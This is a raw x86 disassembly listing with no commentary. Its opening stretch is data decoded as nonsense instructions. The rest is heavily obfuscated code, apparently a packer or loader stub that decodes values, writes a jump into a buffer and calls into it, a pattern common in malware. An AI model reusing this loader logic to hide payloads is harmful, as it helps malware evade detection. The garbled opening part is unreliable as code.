  416aa4:	popf   
  416aa5:	and    cl,bh
  416aa7:	popa   
  416aa8:	xor    DWORD PTR [ecx],esi
  416aaa:	mov    eax,ds:0x21ae962f
  416aaf:	jmp    0x151aa134
  416ab4:	jmp    0x57dca563
  416ab9:	fistp  DWORD PTR [edi]
  416abb:	sub    al,0xaa
  416abd:	rcr    BYTE PTR [ebp+0xa1a7e71],0xcb
  416ac4:	push   ecx
  416ac5:	ja     0x416a60
  416ac7:	in     eax,dx
  416ac8:	in     eax,dx
  416ac9:	call   0xaaab:0x939cbea1
  416ad0:	sti    
  416ad1:	ficomp DWORD PTR [edi-0x3b]
  416ad4:	(bad)  
  416ad5:	add    ah,cl
  416ad7:	cmp    eax,edi
  416ad9:	xchg   esi,eax
  416ada:	pop    esi
  416adb:	adc    ah,BYTE PTR es:[edx+0x4]
  416adf:	out    0xf5,eax
  416ae1:	sbb    DWORD PTR [ecx],edi
  416ae3:	(bad)  
  416ae4:	cmp    eax,0xaee715ce
  416ae9:	outs   dx,DWORD PTR ds:[esi]
  416aea:	sbb    eax,0xbe7a35f5
  416aef:	sbb    DWORD PTR [edi-0x78f0346c],ebp
  416af5:	add    esi,ebx
  416af7:	pop    ebp
  416af8:	hlt    
  416af9:	rcl    BYTE PTR [edx-0x1e],cl
  416afc:	cmc    
  416afd:	mov    ebx,0x7010d239
  416b02:	sahf   
  416b03:	scas   al,BYTE PTR es:[edi]
  416b04:	fwait
  416b05:	lock dec esi
  416b07:	inc    esi
  416b08:	aam    0x64
  416b0a:	(bad)  
  416b0b:	into   
  416b0c:	and    DWORD PTR [esi+0x4d],eax
  416b0f:	inc    ecx
  416b10:	add    esp,DWORD PTR [edx]
  416b12:	outs   dx,DWORD PTR ds:[esi]
  416b13:	loope  0x416af1
  416b15:	enter  0xe03a,0xa2
  416b19:	jmp    DWORD PTR es:[esi+0x440492c2]
  416b20:	jns    0x416aa7
  416b22:	outs   dx,BYTE PTR ds:[esi]
  416b24:	mov    ebx,0x95c71fe8
  416b29:	sti    
  416b2a:	inc    esp
  416b2b:	sbb    ah,al
  416b2d:	jmp    0x4237695d
  416b32:	ins    BYTE PTR es:[edi],dx
  416b33:	mov    BYTE PTR [edx+0x14a5b086],cl
  416b39:	xchg   ebp,eax
  416b3a:	ret    0x10ef
  416b3d:	scas   al,BYTE PTR es:[edi]
  416b3e:	test   al,0x3f
  416b40:	xchg   ecx,eax
  416b41:	mov    cl,0x8e
  416b43:	test   al,0xb9
  416b45:	mov    ecx,0x246d6eba
  416b4a:	adc    BYTE PTR [ebx-0x42c58727],dh
  416b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b51:	nop
  416b52:	adc    BYTE PTR [ecx],dh
  416b54:	shl    DWORD PTR [edx-0x55],cl
  416b57:	inc    ebx
  416b58:	data16 lahf 
  416b5a:	inc    esp
  416b5b:	fs sbb al,0xa
  416b5e:	test   eax,0x8217c297
  416b63:	pushf  
  416b64:	int3   
  416b65:	pop    eax
  416b66:	add    BYTE PTR [ecx+ebp*4+0x7e2c7c13],dl
  416b6d:	iret   
  416b6e:	jge    0x416b36
  416b70:	aas    
  416b71:	adc    dh,ch
  416b73:	out    0xee,eax
  416b75:	sub    bl,dl
  416b77:	sub    edi,DWORD PTR [esi]
  416b79:	jns    0x416b07
  416b7b:	imul   esi,ebp,0xce1b2bf6
  416b81:	or     bh,BYTE PTR [eax+0x1b]
  416b84:	jmp    0x8aee9eff
  416b89:	dec    edx
  416b8a:	pop    es
  416b8b:	push   eax
  416b8c:	jmp    0x2b7153ac
  416b91:	xor    DWORD PTR ds:0xe22e56b4,0xffffffd1
  416b98:	pop    edx
  416b99:	adc    eax,0x3b350f6e
  416b9e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416ba0:	out    0xb3,al
  416ba2:	les    edi,FWORD PTR [ecx]
  416ba4:	dec    edi
  416ba5:	idiv   eax
  416ba7:	mov    edx,0x5ee62825
  416bac:	clc    
  416bad:	jecxz  0x416b7d
  416baf:	or     DWORD PTR [eax],ebp
  416bb1:	call   0x5d91:0x546108cc
  416bb8:	test   dh,dh
  416bba:	inc    edx
  416bbb:	test   BYTE PTR [ebp+0x28],cl
  416bbe:	mov    esi,0xc7ee8fec
  416bc3:	mov    esp,DWORD PTR [ecx]
  416bc5:	mov    bl,0x23
  416bc7:	mov    ecx,DWORD PTR ss:[edx-0x1225ff05]
  416bce:	cmp    eax,DWORD PTR [edx+0x35c00976]
  416bd4:	xor    edi,DWORD PTR [edx]
  416bd6:	sub    al,0x1c
  416bd8:	mov    al,0x8c
  416bda:	loop   0x416bef
  416bdc:	pop    es
  416bdd:	inc    ebx
  416bde:	sub    ebx,DWORD PTR [edi]
  416be0:	dec    esp
  416be1:	push   esi
  416be2:	in     eax,dx
  416be3:	popa   
  416be4:	or     BYTE PTR [ebp+0x57],0x6f
  416be8:	xor    ebx,DWORD PTR [ebx-0x72a68822]
  416bee:	xor    esp,esp
  416bf0:	lods   al,BYTE PTR ds:[esi]
  416bf1:	dec    esp
  416bf2:	and    BYTE PTR [ecx+0xd71a0c4],cl
  416bf8:	pop    ebx
  416bf9:	add    DWORD PTR ds:[edi+esi*4+0x37],ecx
  416bfe:	xor    BYTE PTR ds:0x9fe05348,ah
  416c04:	cmp    al,0xe0
  416c06:	adc    BYTE PTR [ebp+0x4492de95],ah
  416c0c:	or     BYTE PTR ds:[ebx+0x6de6f5e],bl
  416c13:	(bad)  
  416c14:	mov    eax,esi
  416c16:	jbe    0x416c29
  416c18:	mov    edx,0xe9360f1c
  416c1d:	pop    esi
  416c1e:	sub    cl,BYTE PTR [ebp-0x66]
  416c21:	fidivr DWORD PTR [ecx+0x4e]
  416c24:	fldcw  WORD PTR [ecx-0x49]
  416c27:	(bad)  
  416c28:	fs scas eax,DWORD PTR es:[edi]
  416c2a:	pusha  
  416c2b:	mov    al,ds:0x23d8032
  416c30:	je     0x416c2d
  416c32:	ss ja  0x416bd1
  416c35:	pop    edi
  416c36:	pop    eax
  416c37:	mov    ah,BYTE PTR [edx+0x70]
  416c3a:	pop    ss
  416c3b:	in     eax,dx
  416c3c:	enter  0x13a4,0xce
  416c40:	and    esi,DWORD PTR [ebx+0x1f]
  416c43:	jecxz  0x416c15
  416c45:	add    DWORD PTR [esi-0x104cc4fb],esp
  416c4b:	adc    esi,DWORD PTR [ecx+0x4d88ce36]
  416c51:	jle    0x416cb6
  416c53:	mov    ?,WORD PTR ds:0x89aa305f
  416c59:	and    eax,0xff015767
  416c5e:	ja     0x416ccb
  416c60:	push   esp
  416c61:	aas    
  416c62:	std    
  416c63:	cmp    BYTE PTR [edx],bl
  416c65:	loop   0x416c13
  416c67:	imul   eax,ebx,0xfffffff9
  416c6a:	push   esi
  416c6b:	push   esp
  416c6c:	cmp    esi,DWORD PTR [eax+0x303e5be2]
  416c72:	mov    ds:0xe36270,al
  416c77:	into   
  416c78:	lock out dx,al
  416c7a:	or     al,0x4
  416c7c:	pop    eax
  416c7d:	inc    ebp
  416c7e:	repz repnz sub dh,BYTE PTR [esi-0x2d]
  416c83:	scas   al,BYTE PTR es:[edi]
  416c84:	js     0x416cae
  416c86:	div    BYTE PTR [ecx+0x2b5c3d25]
  416c8c:	int3   
  416c8d:	cmp    eax,0x2ddd8fe9
  416c92:	or     al,0xfd
  416c94:	sbb    DWORD PTR [ebp+0x69c2f767],eax
  416c9a:	sbb    BYTE PTR [edx+eax*8+0xb],cl
  416c9e:	cmp    al,BYTE PTR fs:[ebp+ecx*8-0x5e728f68]
  416ca6:	in     eax,dx
  416ca7:	xchg   edi,eax
  416ca8:	ss sub edi,ebp
  416cab:	cmp    BYTE PTR [edx-0x58a0fd06],dh
  416cb1:	pop    ds
  416cb2:	shl    BYTE PTR [eax],cl
  416cb4:	jle    0x416ce4
  416cb6:	inc    ebx
  416cb7:	dec    edx
  416cb8:	add    eax,0x2066ee8e
  416cbd:	push   0x55
  416cbf:	loope  0x416ca4
  416cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cc2:	out    dx,eax
  416cc3:	and    DWORD PTR [esi],edx
  416cc5:	sbb    DWORD PTR [edi],0x533c6393
  416ccb:	sbb    eax,0x9b432a32
  416cd0:	(bad)  [ebx-0x2fcc07a3]
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428e41
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af05
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x42fa2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x42fa00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428e4d
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x42fa04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x42fa38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x42fa08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429ea1
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429eb5
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
